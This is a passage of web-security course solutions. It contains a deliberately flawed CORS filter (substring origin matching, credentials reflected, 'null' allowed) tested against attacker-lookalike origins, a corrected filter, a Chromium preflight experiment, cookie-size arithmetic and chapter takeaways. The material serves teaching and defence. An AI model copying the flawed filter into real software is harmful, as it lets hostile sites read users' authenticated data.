import java.util.List;
import java.util.Map;
import java.util.Set;

// Exercise 05 check: the CORS filter under review and a corrected one, each asked about the same eleven Origin values.
// A filter is a function from the request's Origin to the CORS fields it would send.
public class CorsReview {
    // As written in the exercise
    static Map<String, String> buggy(String origin) {
        Map<String, String> h = new LinkedHashMap<>();
        if (origin != null && (origin.contains("example.com") || origin.equals("null"))) {
            h.put("Access-Control-Allow-Origin", origin);
            h.put("Access-Control-Allow-Credentials", "true");
            h.put("Access-Control-Allow-Methods", "*");
            h.put("Access-Control-Allow-Headers", "*");
            h.put("Access-Control-Max-Age", "86400");
        }
        return h;                                                   // no Vary at all
    }

    static final Set<String> ALLOWED = Set.of("https://shop.example.com", "https://app.example.com");

    // Corrected
    static Map<String, String> fixed(String origin) {
        Map<String, String> h = new LinkedHashMap<>();
        h.put("Vary", "Origin");                                    // always, whatever the answer
        if (origin != null && ALLOWED.contains(origin)) {           // the whole origin, compared exactly
            h.put("Access-Control-Allow-Origin", origin);
            h.put("Access-Control-Allow-Credentials", "true");
            h.put("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE");
            h.put("Access-Control-Allow-Headers", "content-type, authorization");
            h.put("Access-Control-Max-Age", "600");
        }
        return h;
    }

    static String verdict(Map<String, String> h, String origin) {
        boolean reads = origin != null && origin.equals(h.get("Access-Control-Allow-Origin"))
            && "true".equals(h.get("Access-Control-Allow-Credentials"));
        return reads ? "page may read with cookies" : "blocked";
    }

    public static void main(String[] args) {
        List<String> origins = List.of(
            "https://shop.example.com",           // intended
            "https://app.example.com",            // intended
            "https://evil.net",                   // unrelated attacker
            "https://evil-example.com",           // contains "example.com"
            "https://example.com.evil.net",       // contains "example.com"
            "https://notexample.com",             // contains "example.com"
            "http://shop.example.com",            // right host, wrong scheme
            "https://shop.example.com:8443",      // right host, wrong port
            "https://blog.shop.example.com",      // a sibling nobody listed
            "null",                               // sandboxed iframe, data: URL
            "(absent)");                          // same-origin request, curl, a server
        System.out.printf("%-38s %-30s %-30s %s%n", "Origin", "filter as written", "corrected filter", "Vary in the answer");
        for (String o : origins) {
            String origin = o.equals("(absent)") ? null : o;
            Map<String, String> b = buggy(origin), f = fixed(origin);
            System.out.printf("%-38s %-30s %-30s %s%n", o, verdict(b, origin), verdict(f, origin),
                "written: " + (b.containsKey("Vary") ? "yes" : "NO") + ", corrected: " + (f.containsKey("Vary") ? "yes" : "no"));
        }
    }
}
```

```text
Origin                                 filter as written              corrected filter               Vary in the answer
https://shop.example.com               page may read with cookies     page may read with cookies     written: NO, corrected: yes
https://app.example.com                page may read with cookies     page may read with cookies     written: NO, corrected: yes
https://evil.net                       blocked                        blocked                        written: NO, corrected: yes
https://evil-example.com               page may read with cookies     blocked                        written: NO, corrected: yes
https://example.com.evil.net           page may read with cookies     blocked                        written: NO, corrected: yes
https://notexample.com                 page may read with cookies     blocked                        written: NO, corrected: yes
http://shop.example.com                page may read with cookies     blocked                        written: NO, corrected: yes
https://shop.example.com:8443          page may read with cookies     blocked                        written: NO, corrected: yes
https://blog.shop.example.com          page may read with cookies     blocked                        written: NO, corrected: yes
null                                   page may read with cookies     blocked                        written: NO, corrected: yes
(absent)                               blocked                        blocked                        written: NO, corrected: yes
```

The filter as written lets nine of the eleven read with cookies, including every lookalike, the downgraded scheme, the other port, the sibling and `null`.  
The corrected filter admits only the two exact origins, and sends `Vary: Origin` on every answer.

Defect 04, measured in Chromium.  
A throwaway server answers the preflight with each combination, and the page makes a credentialed `PUT` with a JSON body:

```js
// Exercise 05 check: does Chromium honour "*" in Access-Control-Allow-Methods and -Headers on a credentialed request?
// A throwaway server on port 9500 answers every host name; its preflight answer is chosen by the query string.
const http = require('http');
const { chromium } = require('playwright');

const PORT = 9500;
const server = http.createServer((req, res) => {
  const q = new URL(req.url, 'http://x').searchParams;
  const origin = req.headers.origin;
  if (req.url.startsWith('/blank')) { res.setHeader('Content-Type', 'text/html'); return res.end('<html></html>'); }
  res.setHeader('Access-Control-Allow-Origin', origin);
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Vary', 'Origin');
  if (req.method === 'OPTIONS') {
    res.setHeader('Access-Control-Allow-Methods', q.get('methods'));
    res.setHeader('Access-Control-Allow-Headers', q.get('headers'));
    res.statusCode = 204;
    return res.end();
  }
  res.setHeader('Content-Type', 'application/json');
  res.end('{"ok": true}');
});

(async () => {
  await new Promise(r => server.listen(PORT, '127.0.0.1', r));
  const browser = await chromium.launch();
  const page = await (await browser.newContext()).newPage();
  const messages = [];
  page.on('console', m => { if (m.type() === 'error' && m.text().startsWith('Access')) messages.push(m.text()); });
  await page.goto(`http://app.shop.localhost:${PORT}/blank`);
  console.log('preflight answer: Allow-Methods / Allow-Headers      credentialed PUT with a JSON body');
  for (const [methods, headers] of [['*', '*'], ['PUT', '*'], ['*', 'content-type'], ['PUT', 'content-type']]) {
    messages.length = 0;
    const result = await page.evaluate(async t => {
      try { const r = await fetch(t, { method: 'PUT', credentials: 'include', headers: { 'Content-Type': 'application/json' }, body: '{}' }); return 'sent, status ' + r.status; }
      catch (e) { return 'refused'; }
    }, `http://api.shop.localhost:${PORT}/api?methods=${encodeURIComponent(methods)}&headers=${encodeURIComponent(headers)}`);
    console.log(`${(methods + ' / ' + headers).padEnd(52)} ${result}`);
    if (messages[0]) console.log('   ' + messages[0].replace(/^.*has been blocked by CORS policy: /, ''));
  }
  await browser.close();
  server.close();
})();
```

```text
preflight answer: Allow-Methods / Allow-Headers      credentialed PUT with a JSON body
* / *                                                refused
   Method PUT is not allowed by Access-Control-Allow-Methods in preflight response.
PUT / *                                              refused
   Request header field content-type is not allowed by Access-Control-Allow-Headers in preflight response.
* / content-type                                     refused
   Method PUT is not allowed by Access-Control-Allow-Methods in preflight response.
PUT / content-type                                   sent, status 200
```

`*` in `Allow-Methods` is not honoured (`Method PUT is not allowed`), and `*` in `Allow-Headers` is not honoured either (`Request header field content-type is not allowed`).  
Only the explicit pair passes. The wildcards apply to requests without credentials.

**Part 2.** The corrected filter is the `fixed` function above, as the real thing:

```java
private static final Set<String> ALLOWED = Set.of("https://shop.example.com", "https://app.example.com");

String origin = request.getHeader("Origin");
response.addHeader("Vary", "Origin");                                            // always
if (origin != null && ALLOWED.contains(origin)) {                                // exact, whole origin
    response.setHeader("Access-Control-Allow-Origin", origin);
    response.setHeader("Access-Control-Allow-Credentials", "true");
    if (request.getMethod().equals("OPTIONS")) {                                 // a preflight, for an allowed origin only
        response.setHeader("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE");
        response.setHeader("Access-Control-Allow-Headers", "content-type, authorization");
        response.setHeader("Access-Control-Max-Age", "600");
        response.setStatus(204);
        return;
    }
}
if (request.getMethod().equals("OPTIONS")) { response.setStatus(204); return; }  // no approval for anyone else
chain.doFilter(request, response);
```

And defect 06 is repaired outside the filter: `POST /orders` accepts only `Content-Type: application/json` and answers `415` otherwise,  
and every state-changing endpoint carries the CSRF defences of 10.04.

### Solution 06

**Part 1.** Exact arithmetic, `Tax.java`:

```java
// Exercise 06 check: the cookie tax, in bytes.
public class Tax {
    public static void main(String[] args) {
        long cookieField = 1_830;          // bytes of the Cookie field value on every request to the shop host
        long requestsPerPage = 60;
        long staticRequests = 45;          // images, scripts and styles: no cookie is needed for any of them
        long dynamicRequests = requestsPerPage - staticRequests;
        long pageViewsPerDay = 5_000_000;
        long sessionCookie = 26;           // sid=<22 characters>, Lab 04 section 01
        long tokenCookie = 173;            // token=<167 characters>, Lab 04 section 02

        long perPage = cookieField * requestsPerPage;
        System.out.println("a. cookies uploaded per page view:  " + cookieField + " x " + requestsPerPage + " = " + String.format("%,d", perPage) + " bytes");
        System.out.println("   per day:                          " + String.format("%,d", perPage * pageViewsPerDay) + " bytes = " + String.format("%.1f", perPage * pageViewsPerDay / 1e9) + " GB");

        long perPageCookieless = cookieField * dynamicRequests;
        System.out.println("b. static files on a cookieless host: " + cookieField + " x " + dynamicRequests + " = " + String.format("%,d", perPageCookieless) + " bytes per page view");
        System.out.println("   saved per page view:              " + String.format("%,d", perPage - perPageCookieless) + " bytes (" + 100 * staticRequests / requestsPerPage + " % of the cookie traffic)");
        System.out.println("   saved per day:                    " + String.format("%.1f", (perPage - perPageCookieless) * pageViewsPerDay / 1e9) + " GB");

        long extra = (tokenCookie - sessionCookie) * dynamicRequests;
        System.out.println("c. a signed token instead of a session id, on the " + dynamicRequests + " requests that still carry cookies:");
        System.out.println("   (" + tokenCookie + " - " + sessionCookie + ") x " + dynamicRequests + " = " + String.format("%,d", extra) + " extra bytes per page view, " + String.format("%.1f", extra * pageViewsPerDay / 1e9) + " GB per day");
        long wholePage = (tokenCookie - sessionCookie) * requestsPerPage;
        System.out.println("   if the static files still carried it: " + String.format("%,d", wholePage) + " extra bytes per page view, " + String.format("%.1f", wholePage * pageViewsPerDay / 1e9) + " GB per day");
    }
}
```

```text
a. cookies uploaded per page view:  1830 x 60 = 109,800 bytes
   per day:                          549,000,000,000 bytes = 549.0 GB
b. static files on a cookieless host: 1830 x 15 = 27,450 bytes per page view
   saved per page view:              82,350 bytes (75 % of the cookie traffic)
   saved per day:                    411.8 GB
c. a signed token instead of a session id, on the 15 requests that still carry cookies:
   (173 - 26) x 15 = 2,205 extra bytes per page view, 11.0 GB per day
   if the static files still carried it: 8,820 extra bytes per page view, 44.1 GB per day
```

(a) 109,800 bytes per page view and 549.0 GB a day, about 16.5 TB over 30 days.  
(b) The 45 static requests carry 82,350 of the 109,800 bytes, 75 %, so a cookieless static host saves about 411.8 GB a day.  
(c) Swapping 26 bytes for 173 on the 15 requests that still carry cookies adds 2,205 bytes per page view, 11.0 GB a day; had the static files still carried it, 8,820 bytes and 44.1 GB.  
Moving the static files is worth much more than the token costs: with both changes the shop receives about 148 GB a day, with the token and the static files left behind about 593 GB.

**Part 2.**  
With blocking on, `wid` is neither stored nor sent in the iframe (Lab 06: `wu` shows `[]`), so the widget forgets the visitor's last order on every load.  
The widget needs per-embedding-site state, not cross-site identity, so partition the cookie:

```
Set-Cookie: __Host-wid=<id>; Path=/; Secure; SameSite=None; Partitioned
```

`Domain` is dropped (the cookie is for `widgets.example.com` alone; the prefix demands it), and `Partitioned` makes the browser keep one copy per top-level site (Lab 06: `wp`, and the variant with `__Host-` in Lab 06 try 03).  
What the team gives up: the widget no longer recognises the same visitor across two partner sites, so a visitor who tracked an order on `partner.example.org` and opens the widget on another site starts over,  
and anything that depended on that recognition (a single login across partners) must move to a top-level redirect flow (10.05).  
Browsers with blocking off keep working as before, and `Partitioned` works there too.

---

## 10.11 Takeaways

- An **origin** is scheme, host and port; a **site** is scheme and registrable domain.  
  Cookies use neither: they use host and path, and `Secure`, and they ignore the port.  
  Each browser mechanism has its own boundary, and bugs live in the gaps.

- The **same-origin policy** hides responses. It does not stop requests, which is why CSRF exists at all.

- A cookie is created by one `Set-Cookie` field per cookie and returned in one `Cookie` field of names and values.  
  The server never sees `Domain`, `Path`, `Secure`, `HttpOnly` or `SameSite`: they are instructions to the browser.

- Prefer **host-only** cookies; `Domain` makes every subdomain a trusted party. `Path` organises and does not protect.

- A session cookie today is `__Host-<name>=<128 random bits>; Path=/; Secure; HttpOnly; SameSite=Lax`.  
  Say `SameSite` explicitly; do not depend on a browser's default.

- `SameSite` is about the **site**. It stops other sites, and does nothing against a sibling subdomain, against a state change on `GET` under `Lax`, or against XSS.

- A **server-side session** is small, revocable and needs a shared store.  
  A **signed token** is stateless to verify, larger on every request and cannot be revoked without server state. Both are bearer credentials.  
  The verifier chooses the algorithm and the key; the token never does.

- Rotate the session id at login. Enforce idle and absolute timeouts on the server.  
  Destroy the server record at logout.

- Defend **CSRF** in layers: `SameSite`, no state change on `GET`, an `Origin` or `Sec-Fetch-Site` check, a token for the rest.  
  **XSS** defeats `HttpOnly` as a defence: it stops the theft of the cookie and not its use.

- **CORS** is a browser's opt-in for cross-origin reads.  
  Compare the whole origin against a fixed list, never reflect with credentials, never allow `null`, send `Vary: Origin`.  
  It protects users, not the server, and it is not a CSRF defence.

- **Third-party cookies** are going away unevenly: Safari blocks, Firefox partitions, Chrome allows.  
  An embed that needs memory uses `Partitioned`; one that needs identity uses a top-level flow.

- Every matching cookie travels with **every request** to the host. Count the bytes.

---
